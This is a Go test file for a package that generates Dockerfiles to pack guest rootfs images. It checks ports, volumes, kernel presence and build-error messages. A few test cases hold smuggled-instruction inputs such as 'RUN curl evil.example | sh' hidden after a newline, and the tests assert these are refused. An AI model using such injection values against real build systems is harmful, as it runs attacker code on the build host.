package guestpack

import (
	"bytes"
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/bwsalmon/granule/pkg/dockercli"
	"github.com/bwsalmon/granule/pkg/guestimage"
	"github.com/bwsalmon/granule/pkg/vmspec"
)

var fakedockerPath string

func TestMain(m *testing.M) {
	dir, err := os.MkdirTemp("", "fakedocker-pack")
	if err != nil {
		panic(err)
	}
	defer os.RemoveAll(dir)

	fakedockerPath = filepath.Join(dir, "fakedocker")
	cmd := exec.Command("go", "build", "-o", fakedockerPath, "./testdata/fakedocker")
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		panic("building fakedocker test helper: " + err.Error())
	}

	os.Exit(m.Run())
}

// testOptions returns Options pointed at fakedocker, a function reading
// back the calls it recorded, and a function reading back the Dockerfile
// the build was given.
func testOptions(t *testing.T) (Options, func() [][]string, func() string) {
	t.Helper()
	dir := t.TempDir()
	logPath := filepath.Join(dir, "calls.log")
	savePath := filepath.Join(dir, "Dockerfile")
	t.Setenv("FAKEDOCKER_LOG", logPath)
	t.Setenv(dockercli.EnvBinary, fakedockerPath)
	t.Setenv("FAKEDOCKER_SAVE_DOCKERFILE", savePath)

	opts := Options{
		From:   "ghcr.io/example/my-guest-rootfs:v3",
		Tag:    "my-guest:packed",
		Stdout: &bytes.Buffer{},
		Stderr: &bytes.Buffer{},
	}
	calls := func() [][]string {
		data, err := os.ReadFile(logPath)
		if err != nil {
			if os.IsNotExist(err) {
				return nil
			}
			t.Fatalf("reading fakedocker log: %v", err)
		}
		var out [][]string
		for _, line := range strings.Split(strings.TrimRight(string(data), "\n"), "\n") {
			if line != "" {
				out = append(out, strings.Split(line, "\x1f"))
			}
		}
		return out
	}
	dockerfile := func() string {
		data, err := os.ReadFile(savePath)
		if err != nil {
			t.Fatalf("reading the saved Dockerfile: %v", err)
		}
		return string(data)
	}
	return opts, calls, dockerfile
}

func TestPackDrivesOneBuild(t *testing.T) {
	opts, calls, dockerfile := testOptions(t)
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}

	build := buildCall(t, calls())
	joined := strings.Join(build, " ")
	for _, want := range []string{"--tag my-guest:packed", "--file "} {
		if !strings.Contains(joined, want) {
			t.Errorf("build call %q does not contain %q", joined, want)
		}
	}
	// The build context is the directory holding the generated
	// Dockerfile and nothing else: no part of the host's filesystem is
	// sent to the daemon.
	ctxDir := build[len(build)-1]
	if got := filepath.Dir(flagValue(build, "--file")); got != ctxDir {
		t.Errorf("build context is %q but the Dockerfile is in %q", ctxDir, got)
	}

	df := dockerfile()
	// The image being packed appears exactly once, and as a COPY: this
	// is the property the package exists to keep, so it is asserted
	// rather than left to review.
	if n := strings.Count(df, opts.From); n != 2 {
		t.Errorf("the packed image is named %d times in the build, want 2 (a COPY --from and the provenance label):\n%s", n, df)
	}
	if !strings.Contains(df, "COPY --from="+opts.From+" / /rootfs") {
		t.Errorf("no COPY of the packed rootfs:\n%s", df)
	}
	for _, line := range strings.Split(df, "\n") {
		if strings.HasPrefix(line, "RUN") && strings.Contains(line, opts.From) {
			t.Errorf("a RUN mentions the image being packed, which pack must never execute: %q", line)
		}
	}
	if n := strings.Count(df, "\nRUN "); n != 2 {
		t.Errorf("the build has %d RUN instructions, want 2 (mke2fs's own install and pack-guest):\n%s", n, df)
	}

	// The default VMM half is the image every other command defaults to,
	// and it supplies the guest-side parts too.
	if !strings.Contains(df, "COPY --from="+vmspec.DockerImage+" "+guestimage.PartsDir+"/ "+partsIn+"/") {
		t.Errorf("the parts are not copied out of %s:\n%s", vmspec.DockerImage, df)
	}
	if !strings.Contains(df, "FROM "+vmspec.DockerImage+"\n") {
		t.Errorf("the output image is not built on %s:\n%s", vmspec.DockerImage, df)
	}
	// The script is run at the path the parts were copied *to* in the
	// packer image, not at the absolute path it has in the granule image
	// -- the packer image is a third image with a filesystem of its own,
	// and running the latter is a build that fails at its one RUN.
	if !strings.Contains(df, "/bin/sh "+partsIn+"/pack-guest /rootfs "+partsIn+" "+guestimage.Under(stagingRoot, guestimage.Dir)) {
		t.Errorf("pack-guest is not run over the copied tree:\n%s", df)
	}
	if !strings.Contains(df, "COPY --from=pack "+guestimage.Under(stagingRoot, guestimage.Dir)+"/ "+guestimage.Dir+"/") {
		t.Errorf("the packed guest half is not copied to %s:\n%s", guestimage.Dir, df)
	}
	if !strings.Contains(df, "GUEST_DISK_EXTRA_MB=0 GRANULE_GUEST_VARIANT=auto") {
		t.Errorf("the default settings are not passed to pack-guest:\n%s", df)
	}
	// What the packed guest declares about itself, so that a later cheap
	// rebase can tell a guest it may leave alone from one whose
	// granule-side pieces it cannot drive. The same number is inside the
	// disk, placed by the overlay; this is the copy readable without
	// opening it.
	if want := guestimage.ContractLabel + `="` + guestimage.ContractValue() + `"`; !strings.Contains(df, want) {
		t.Errorf("the packed image does not declare the guest-side contract it implements (%s):\n%s", want, df)
	}
}

func TestPackPassesSettingsThrough(t *testing.T) {
	opts, calls, dockerfile := testOptions(t)
	opts.KonturImage = "ghcr.io/example/kontur-runtime:2026-09"
	opts.PackerImage = "alpine:3.20"
	opts.Variant = "alpine"
	opts.DiskExtraMB = 2048
	opts.ExtraBuildArgs = []string{"--network", "host"}
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}

	df := dockerfile()
	for _, want := range []string{
		"FROM alpine:3.20 AS pack",
		"COPY --from=ghcr.io/example/kontur-runtime:2026-09 " + guestimage.PartsDir,
		"FROM ghcr.io/example/kontur-runtime:2026-09\n",
		"GUEST_DISK_EXTRA_MB=2048 GRANULE_GUEST_VARIANT=alpine",
	} {
		if !strings.Contains(df, want) {
			t.Errorf("the build does not contain %q:\n%s", want, df)
		}
	}
	if joined := strings.Join(buildCall(t, calls()), " "); !strings.Contains(joined, "--network host") {
		t.Errorf("extra build args did not reach docker build: %q", joined)
	}
}

// TestPackCarriesExposedPorts: what a consumer declared with EXPOSE in
// their guest Dockerfile has to survive the packing, because the packed
// image is built on the granule image rather than on their rootfs and
// inherits none of that rootfs's config on its own.
//
// Declared, not opened: the EXPOSE lands in the packed image's own
// config for a launcher to read, and nothing here grants anything.
func TestPackCarriesExposedPorts(t *testing.T) {
	opts, calls, dockerfile := testOptions(t)
	out := &bytes.Buffer{}
	opts.Stdout = out
	// Unsorted and undecorated, the way an image's config map hands them
	// over: what comes out has to be stable and docker-spelled.
	t.Setenv("FAKEDOCKER_EXPOSED", "8080/tcp 53/udp 443")

	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}

	// The declaration is read from the image being packed, not guessed.
	var inspected bool
	for _, call := range calls() {
		if len(call) > 3 && call[0] == "image" && call[1] == "inspect" && strings.Contains(strings.Join(call, " "), "ExposedPorts") {
			if call[len(call)-1] != opts.From {
				t.Errorf("the ports were read from %q, want the image being packed", call[len(call)-1])
			}
			inspected = true
		}
	}
	if !inspected {
		t.Errorf("pack never asked %s what it declares: %v", opts.From, calls())
	}

	df := dockerfile()
	if !strings.Contains(df, "\nEXPOSE 443/tcp 53/udp 8080/tcp\n") {
		t.Errorf("the declared ports are not carried into the packed image, sorted and with protocols:\n%s", df)
	}
	// In the final stage, which is the one whose config the packed image
	// has -- an EXPOSE in the packing stage would be thrown away with it.
	if strings.Index(df, "\nEXPOSE ") < strings.LastIndex(df, "\nFROM ") {
		t.Errorf("EXPOSE is above the last FROM, so it lands in a stage that is discarded:\n%s", df)
	}
	if !strings.Contains(out.String(), "declared, not opened") {
		t.Errorf("a pack that carried a declaration did not say what it does and does not mean:\n%s", out)
	}
}

// An image that declares nothing gets no EXPOSE and no noise about it.
func TestPackWithoutExposedPorts(t *testing.T) {
	opts, _, dockerfile := testOptions(t)
	out := &bytes.Buffer{}
	opts.Stdout = out
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	if strings.Contains(dockerfile(), "\nEXPOSE ") {
		t.Errorf("an image that declares no ports produced an EXPOSE:\n%s", dockerfile())
	}
	if strings.Contains(out.String(), "declared, not opened") {
		t.Errorf("a pack with nothing to carry talked about carrying:\n%s", out)
	}
}

func TestPackCarriesVolumes(t *testing.T) {
	opts, _, dockerfile := testOptions(t)
	out := &bytes.Buffer{}
	opts.Stdout = out
	t.Setenv("FAKEDOCKER_VOLUMES", "/var/log /data/db")

	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}

	df := dockerfile()
	if !strings.Contains(df, `dev.granule.guest.volumes="[\"/data/db\",\"/var/log\"]"`) {
		t.Errorf("the declared volumes are not carried into image label:\n%s", df)
	}
	if !strings.Contains(df, `VOLUME ["/data/db","/var/log"]`) {
		t.Errorf("VOLUME instruction not generated in dockerfile:\n%s", df)
	}
}

// A port that is not a port never reaches the generated Dockerfile: the
// values come from an image somebody else authored, and a value with a
// newline in it is an instruction in the one build whose whole point is
// that nothing of that image runs.
func TestPackRefusesUnusablePortDeclarations(t *testing.T) {
	opts, calls, _ := testOptions(t)
	opts.ExposedPorts = []string{"8080/tcp\nRUN curl evil.example | sh"}
	err := Pack(context.Background(), opts)
	if err == nil || !strings.Contains(err.Error(), "not a usable port declaration") {
		t.Fatalf("Pack = %v, want a refusal of the port", err)
	}
	if got := calls(); len(got) != 0 {
		t.Errorf("docker was called for input that should never have reached it: %v", got)
	}

	// The same value coming out of the image itself is dropped rather
	// than fatal -- it is metadata nothing acts on, and the pack is
	// otherwise fine -- but it is dropped out loud.
	opts, _, dockerfile := testOptions(t)
	out := &bytes.Buffer{}
	opts.Stdout = out
	t.Setenv("FAKEDOCKER_EXPOSED", "notaport 8080/tcp")
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	if !strings.Contains(out.String(), "ignoring") {
		t.Errorf("a port declaration that could not be carried was dropped silently:\n%s", out)
	}
	if df := dockerfile(); !strings.Contains(df, "\nEXPOSE 8080/tcp\n") {
		t.Errorf("the usable declaration did not survive its unusable neighbour:\n%s", df)
	}
}

func TestPackRejectsBadInput(t *testing.T) {
	for _, tc := range []struct {
		name string
		edit func(*Options)
		want string
	}{
		{"no image", func(o *Options) { o.From = "" }, "required"},
		{"no tag", func(o *Options) { o.Tag = "" }, "required"},
		{"unknown variant", func(o *Options) { o.Variant = "ubuntu" }, "unknown guest variant"},
		{"negative headroom", func(o *Options) { o.DiskExtraMB = -1 }, "negative"},
		// A reference carrying a newline could append instructions to
		// the generated Dockerfile -- a RUN of its own, in the one build
		// whose point is that nothing from an untrusted image runs.
		{"injected instruction", func(o *Options) {
			o.From = "rootfs:v1\nRUN curl evil.example | sh"
		}, "not a usable image reference"},
		{"injected into the tag", func(o *Options) { o.Tag = "out:v1\nFROM scratch" }, "not a usable image reference"},
		{"space in the packer image", func(o *Options) { o.PackerImage = "debian:12 AS x" }, "not a usable image reference"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			opts, calls, _ := testOptions(t)
			tc.edit(&opts)
			err := Pack(context.Background(), opts)
			if err == nil {
				t.Fatal("Pack succeeded, want an error")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not mention %q", err, tc.want)
			}
			if got := calls(); len(got) != 0 {
				t.Errorf("docker was called %d times for input that should never have reached it: %v", len(got), got)
			}
		})
	}
}

// A granule image built before pack existed has no parts directory to
// copy, and the build's own message for that is a bare "not found" on a
// path nobody has seen before.
func TestPackExplainsAMissingPartsDirectory(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_DOCKERFILE_CONTAINS", guestimage.PartsDir)
	err := Pack(context.Background(), opts)
	if err == nil {
		t.Fatal("Pack succeeded, want an error")
	}
	if !strings.Contains(err.Error(), "--target runtime") {
		t.Errorf("error does not say how to get a granule image that carries the parts: %v", err)
	}
	// And which build to reach for first. Naming the lean one alone --
	// which this message used to do -- sends a rootfs that brings no
	// kernel to an image that cannot boot it, and so to the refusal
	// above, from the sentence that was meant to unblock it.
	for _, want := range []string{"docker build .", guestimage.RuntimeKernel} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error does not mention %q, so it recommends the lean build unconditionally: %v", want, err)
		}
	}

	// The same thing again, with a real daemon's whole log rather than
	// the one line the fake writes: the explanation has to survive
	// being asked of buildkit's actual output, since that output is
	// the only thing pack ever gets.
	t.Setenv("FAKEDOCKER_FAIL_WITH", partsMissing)
	err = Pack(context.Background(), opts)
	if err == nil {
		t.Fatal("Pack succeeded, want an error")
	}
	if !strings.Contains(err.Error(), "has no "+guestimage.PartsDir) {
		t.Errorf("a real build's missing-parts failure was not explained: %v", err)
	}
}

// partsMissing is Docker 29.8.1's own output, pasted from a real build,
// for the failure the message above is for: the granule image being
// packed onto does not carry the parts directory, so the COPY that
// wants it is the step that fails.
const partsMissing = `#6 [pack 3/5] COPY --from=` + vmspec.DockerImage + ` ` + guestimage.PartsDir + `/ /parts/
#6 ERROR: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::l1rpiujg5nrz9cig19962b25m: "` + guestimage.PartsDir + `": not found
------
 > [pack 3/5] COPY --from=` + vmspec.DockerImage + ` ` + guestimage.PartsDir + `/ /parts/:
------
ERROR: failed to build: failed to solve: failed to compute cache key: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::l1rpiujg5nrz9cig19962b25m: "` + guestimage.PartsDir + `": not found`

// packFailedAfterTheParts is Docker 29.8.1's own output for a pack
// whose packing step produced no output directory -- the last twenty
// lines of it, which is what reaches the error. Pasted from a real
// build rather than written here: the step that copies the parts in is
// in this log, and it is in it having *succeeded*, which is the whole
// reason an explanation matched across the text blames it.
const packFailedAfterTheParts = `#6 [pack 3/5] COPY --from=` + vmspec.DockerImage + ` ` + guestimage.PartsDir + `/ /parts/
#6 DONE 0.3s

#7 [pack 4/5] RUN GUEST_DISK_EXTRA_MB=0 GRANULE_GUEST_VARIANT=auto     /bin/sh /parts/pack-guest /rootfs /parts /out/var/lib/granule/guest
#7 DONE 0.6s

#8 [stage-2 2/2] COPY --from=pack /out/var/lib/granule/guest/ /var/lib/granule/guest/
#8 ERROR: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::b5ovixcg2ezdkegc1lumic67n: "/out/var/lib/granule/guest": not found
------
 > [stage-2 2/2] COPY --from=pack /out/var/lib/granule/guest/ /var/lib/granule/guest/:
------
ERROR: failed to build: failed to solve: failed to compute cache key: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::b5ovixcg2ezdkegc1lumic67n: "/out/var/lib/granule/guest": not found`

// The other side of the message above: a build that failed for a reason
// of its own is left to say so. The parts directory is named in every
// pack's log whether or not it is the problem, so an explanation that
// only asks whether the log says "not found" somewhere and names the
// parts somewhere else sends the caller off to rebuild a granule image
// that was never at fault.
func TestPackDoesNotBlameTheGranuleImageForALaterFailure(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_WITH", packFailedAfterTheParts)
	err := Pack(context.Background(), opts)
	if err == nil {
		t.Fatal("Pack succeeded, want the build's failure to come back as an error")
	}
	if strings.Contains(err.Error(), "has no "+guestimage.PartsDir) {
		t.Errorf("a packing failure was explained as a granule image with no parts directory: %v", err)
	}
	// And what the caller is left with is docker's own message, which is
	// about the step that actually failed.
	if !strings.Contains(err.Error(), `"/out/var/lib/granule/guest": not found`) {
		t.Errorf("the build's own message did not survive: %v", err)
	}
}

// rootfsUnresolvable is Docker 29.8.1's own output for the other way a
// pack fails before it packs anything: the rootfs image's repository
// needs a token this machine has not got, which is what an unauthorized
// ghcr.io pull looks like. Note what it does not say -- neither "not
// found" nor "no such file" -- and that the only line naming the image
// is the head of the vertex buildkit failed on.
const rootfsUnresolvable = `#2 [internal] load metadata for ` + vmspec.DockerImage + `
#2 DONE 0.1s

#3 [internal] load metadata for ghcr.io/example/my-guest-rootfs:v3
#3 ERROR: failed to authorize: failed to fetch anonymous token: unexpected status from GET request to https://ghcr.io/token?scope=repository%3Aexample%2Fmy-guest-rootfs%3Apull&service=ghcr.io: 403 Forbidden
------
 > [internal] load metadata for ghcr.io/example/my-guest-rootfs:v3:
------
ERROR: failed to build: failed to solve: failed to fetch anonymous token: unexpected status from GET request to https://ghcr.io/token?scope=repository%3Aexample%2Fmy-guest-rootfs%3Apull&service=ghcr.io: 403 Forbidden`

// Every input a pack has is an image reference, and a reference that
// will not resolve is a registry, credential or network answer rather
// than anything about what an image carries -- which is the only kind of
// failure a pack used to explain.
func TestPackExplainsAnUnresolvableReference(t *testing.T) {
	packerTagMissing := func(ref string) string {
		return `#3 [internal] load metadata for ` + ref + `
#3 ERROR: ` + ref + `: not found
------
 > [internal] load metadata for ` + ref + `:
------
ERROR: failed to build: failed to solve: ` + ref + `: failed to resolve source metadata for ` + ref + `: ` + ref + `: not found`
	}
	for _, tc := range []struct {
		name string
		log  string
		want []string
	}{
		{"the rootfs being packed", rootfsUnresolvable, []string{"ghcr.io/example/my-guest-rootfs:v3 could not be resolved", "-from"}},
		{"the image the packing runs in", packerTagMissing(DefaultPackerImage), []string{DefaultPackerImage + " could not be resolved", "-packer-image"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			opts, _, _ := testOptions(t)
			t.Setenv("FAKEDOCKER_FAIL_WITH", tc.log)
			err := Pack(context.Background(), opts)
			if err == nil {
				t.Fatal("Pack succeeded, want the build's failure to come back as an error")
			}
			for _, want := range tc.want {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("the explanation does not mention %q: %v", want, err)
				}
			}
			// Never the sentence about an image that was read and found
			// wanting: on these builds nothing was read at all.
			if strings.Contains(err.Error(), "has no "+guestimage.PartsDir) {
				t.Errorf("a reference that did not resolve was explained as a granule image with no parts: %v", err)
			}
		})
	}
}

// The granule image never reaches the build when its reference will not
// resolve: a pack reads whether it carries a kernel first, so what stops
// is a `docker create`, whose message for a registry that wants a login
// says only "denied".
func TestPackExplainsAnUnresolvableGranuleImage(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_CONTAINS", "create "+vmspec.DockerImage)
	t.Setenv("FAKEDOCKER_FAIL_MESSAGE", "Unable to find image '"+vmspec.DockerImage+"' locally\nError response from daemon: error from registry: denied\ndenied")

	err := Pack(context.Background(), opts)
	if err == nil {
		t.Fatal("Pack succeeded, want an error")
	}
	for _, want := range []string{vmspec.DockerImage + " could not be resolved", "-kontur-image", "docker login"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the explanation does not mention %q: %v", want, err)
		}
	}
	if !strings.Contains(err.Error(), "error from registry: denied") {
		t.Errorf("docker's own message did not survive: %v", err)
	}
}

// And the granule image that answers and is simply the wrong one is
// still left to the explanation it already had: a read that failed for a
// reason of the daemon's is not a registry refusing the reference.
func TestPackDoesNotBlameTheRegistryForAReadThatFailed(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_CONTAINS", "create "+vmspec.DockerImage)
	t.Setenv("FAKEDOCKER_FAIL_MESSAGE", "Error response from daemon: no space left on device")

	err := Pack(context.Background(), opts)
	if err == nil {
		t.Fatal("Pack succeeded, want an error")
	}
	if strings.Contains(err.Error(), "could not be resolved") {
		t.Errorf("a full disk was explained as a reference a registry would not hand over: %v", err)
	}
}

// And the other side of it: a build that resolved everything and failed
// later names all three references in its tail anyway.
func TestPackDoesNotReportAResolvedImageAsUnresolvable(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_WITH", packFailedAfterTheParts)
	err := Pack(context.Background(), opts)
	if err == nil {
		t.Fatal("Pack succeeded, want the build's failure to come back as an error")
	}
	if strings.Contains(err.Error(), "could not be resolved") {
		t.Errorf("a packing failure was explained as a reference that would not resolve: %v", err)
	}
}

// A `docker build --target runtime` granule image carries no kernel, and
// the reference guest rootfs brings none either -- so packing one onto
// the other produces an image whose boot stops at a missing CHV_KERNEL
// on whatever node runs it. The build asserts its way out of that before
// it packs anything, and the assertion names both halves and both ways
// out.
func TestPackRefusesWhenNeitherHalfBringsAKernel(t *testing.T) {
	opts, _, dockerfile := testOptions(t)
	opts.KonturImage = "granule:runtime"
	t.Setenv("FAKEDOCKER_ABSENT", opts.KonturImage+"="+guestimage.RuntimeKernel)

	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	file := dockerfile()
	if !strings.Contains(file, "ls /rootfs/boot/vmlinuz-*") {
		t.Fatalf("the generated build does not check that the rootfs brings a kernel:\n%s", file)
	}
	if !strings.Contains(file, NoKernelMarker) {
		t.Errorf("the check does not echo the marker pack recognizes:\n%s", file)
	}
	// The marker is echoed from a generated shell command: a backtick or
	// a dollar in it would be the shell's rather than the message's.
	if strings.ContainsAny(NoKernelMarker, "`$\"") {
		t.Errorf("the marker would be interpreted by the shell: %q", NoKernelMarker)
	}

	// And when the build stops on it, the explanation is what the caller
	// is left holding: both halves named, and both ways out.
	t.Setenv("FAKEDOCKER_FAIL_DOCKERFILE_CONTAINS", NoKernelMarker)
	err := Pack(context.Background(), opts)
	if err == nil {
		t.Fatal("Pack succeeded, want the build's refusal to come back as an error")
	}
	for _, want := range []string{guestimage.RuntimeKernel, "--target runtime", "GUEST_KERNEL_PACKAGE", opts.KonturImage, opts.From} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not mention %q: %v", want, err)
		}
	}
}

func TestPackDiskMode(t *testing.T) {
	opts, _, dockerfile := testOptions(t)
	opts.DiskMode = "persistent"
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	df := dockerfile()
	if !strings.Contains(df, `ENV CHV_DISK_MODE="persistent"`) {
		t.Errorf("ENV CHV_DISK_MODE not found in generated dockerfile:\n%s", df)
	}
}

func TestPackInvalidDiskMode(t *testing.T) {
	opts, _, _ := testOptions(t)
	opts.DiskMode = "invalid-mode"
	err := Pack(context.Background(), opts)
	if err == nil || !strings.Contains(err.Error(), "unknown disk mode") {
		t.Fatalf("Pack = %v, want unknown disk mode error", err)
	}
}

// The ordinary pack, onto a granule image that does carry the kernel:
// nothing to assert, because the VMM half boots whatever the rootfs
// turns out to be.
func TestPackDoesNotDemandAGuestKernelWhenTheVMMHalfHasOne(t *testing.T) {
	opts, _, dockerfile := testOptions(t)
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	if file := dockerfile(); strings.Contains(file, "/rootfs/boot/vmlinuz-*") {
		t.Errorf("the generated build demands a kernel in the rootfs even though the VMM half has one:\n%s", file)
	}
}

// The size warning's advice depends on the guest that was just packed:
// the lean build sheds the bundled guest, but it sheds the kernel with
// it, and saying so unconditionally is how a pack that succeeds becomes
// a boot that does not.
func TestPackSizeAdviceDependsOnWhetherTheGuestBringsAKernel(t *testing.T) {
	opts, _, _ := testOptions(t)
	out := &bytes.Buffer{}
	opts.Stdout = out
	t.Setenv("FAKEDOCKER_SIZE", "600000000")

	// The ordinary guest: no kernel of its own, so the full image is
	// what boots it and the lean build is not advice to follow.
	t.Setenv("FAKEDOCKER_ABSENT", opts.Tag+"="+guestimage.GuestKernel)
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	if !strings.Contains(out.String(), "brings no kernel of its own") {
		t.Errorf("the advice does not say why the lean build will not do here:\n%s", out)
	}
	if strings.Contains(out.String(), "stop paying for two guests") {
		t.Errorf("a guest with no kernel of its own was told to pack onto the kernel-free build:\n%s", out)
	}

	// A guest built with GUEST_KERNEL_PACKAGE: it needs nothing from the
	// VMM half but the VMM half, so the advice stands.
	out.Reset()
	t.Setenv("FAKEDOCKER_ABSENT", "")
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	if !strings.Contains(out.String(), "stop paying for two guests") {
		t.Errorf("a guest bringing its own kernel was not told it can shed the bundled one:\n%s", out)
	}
}

func TestPackReportsWhatTheBaseCosts(t *testing.T) {
	opts, _, _ := testOptions(t)
	out := &bytes.Buffer{}
	opts.Stdout = out
	t.Setenv("FAKEDOCKER_SIZE", "600000000")
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	if !strings.Contains(out.String(), "bundled guest") {
		t.Errorf("a 600MB base image was not flagged as carrying a guest of its own:\n%s", out)
	}

	out.Reset()
	t.Setenv("FAKEDOCKER_SIZE", "40000000")
	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}
	if strings.Contains(out.String(), "bundled guest") {
		t.Errorf("a 40MB base image was flagged as carrying a guest:\n%s", out)
	}
	if !strings.Contains(out.String(), "packed my-guest:packed") {
		t.Errorf("no line saying what was packed:\n%s", out)
	}
}

func TestPackCarriesNativeWorkload(t *testing.T) {
	opts, _, dockerfile := testOptions(t)
	out := &bytes.Buffer{}
	opts.Stdout = out
	t.Setenv("FAKEDOCKER_CONFIG", `{"Entrypoint":["/usr/bin/myapp"],"Cmd":["--serve","--port=8080"],"Env":["APP_ENV=prod"],"WorkingDir":"/app","User":"appuser","StopSignal":"SIGTERM"}`)

	if err := Pack(context.Background(), opts); err != nil {
		t.Fatalf("Pack: %v", err)
	}

	df := dockerfile()
	if !strings.Contains(df, "COPY container.json /rootfs/etc/granule/container.json") {
		t.Errorf("Dockerfile does not copy container.json:\n%s", df)
	}

	if !strings.Contains(out.String(), "recording native workload for my-guest:packed: /usr/bin/myapp --serve --port=8080") {
		t.Errorf("Pack output missing workload summary: %s", out.String())
	}
}

// buildCall is the `docker build` among the calls pack made. It is found
// rather than indexed because a pack also asks the image being packed
// what it declares, and where that query sits relative to the build is
// not something these tests are about.
func buildCall(t *testing.T, recorded [][]string) []string {
	t.Helper()
	for _, call := range recorded {
		if len(call) > 0 && call[0] == "build" {
			return call
		}
	}
	t.Fatalf("no docker build among %d recorded calls: %v", len(recorded), recorded)
	return nil
}

func flagValue(args []string, name string) string {
	for i, a := range args {
		if a == name && i+1 < len(args) {
			return args[i+1]
		}
	}
	return ""
}

// KernelRefusal's way out names a kernel package, and it has to be one
// the architecture the guest runs on can boot: linux-image-amd64 on an
// arm64 host installs a kernel the guest cannot run.
func TestKernelRefusalNamesThisArchitecturesKernelPackage(t *testing.T) {
	for _, tc := range []struct{ goarch, want string }{
		{"amd64", "linux-image-amd64"},
		{"arm64", "linux-image-arm64"},
	} {
		if got := guestKernelPackage(tc.goarch); got != tc.want {
			t.Errorf("guestKernelPackage(%q) = %q, want %q", tc.goarch, got, tc.want)
		}
	}
	if msg, want := KernelRefusal("rootfs", "granule:runtime"), "GUEST_KERNEL_PACKAGE="+guestKernelPackage(runtime.GOARCH)+" "; !strings.Contains(msg, want) {
		t.Errorf("KernelRefusal = %q, want it to name %q", msg, want)
	}
}

// DefaultPackerImage and the Dockerfile's guest-image stage pack guests
// from the same base, pinned to the same digest: a digest bump that moved
// one and not the other would have `granule guest pack` and the image's
// own bundled guest packed by different userlands.
func TestDefaultPackerImageMatchesDockerfile(t *testing.T) {
	if !strings.Contains(DefaultPackerImage, "@sha256:") {
		t.Fatalf("DefaultPackerImage = %q, want it pinned by digest", DefaultPackerImage)
	}
	df, err := os.ReadFile("../../Dockerfile")
	if err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(string(df), "\n") {
		f := strings.Fields(line)
		if len(f) == 4 && f[0] == "FROM" && f[2] == "AS" && f[3] == "guest-image" {
			if f[1] != DefaultPackerImage {
				t.Fatalf("the Dockerfile's guest-image stage is FROM %s, DefaultPackerImage is %s; deploy/base-images.sh update keeps them together", f[1], DefaultPackerImage)
			}
			return
		}
	}
	t.Fatal("no `FROM <image> AS guest-image` in the Dockerfile")
}

func TestDockerfile_StorageBackendExtents(t *testing.T) {
	df, err := Dockerfile(Options{
		From:           "ghcr.io/example/my-guest-rootfs:v1",
		Tag:            "my-guest:extents",
		StorageBackend: "extents",
		ExtentSizeMB:   16,
	})
	if err != nil {
		t.Fatalf("Dockerfile: %v", err)
	}
	for _, want := range []string{
		"GRANULE_STORAGE_BACKEND=extents GRANULE_EXTENT_SIZE_MB=16",
		`ENV CHV_STORAGE_BACKEND="extents"`,
		`ENV CHV_EXTENT_SIZE_MB="16"`,
	} {
		if !strings.Contains(df, want) {
			t.Errorf("Dockerfile missing %q:\n%s", want, df)
		}
	}

	if _, err := Dockerfile(Options{
		From:           "ghcr.io/example/my-guest-rootfs:v1",
		Tag:            "my-guest:bad",
		StorageBackend: "bogus",
	}); err == nil {
		t.Errorf("expected error for unknown storage backend")
	}
}
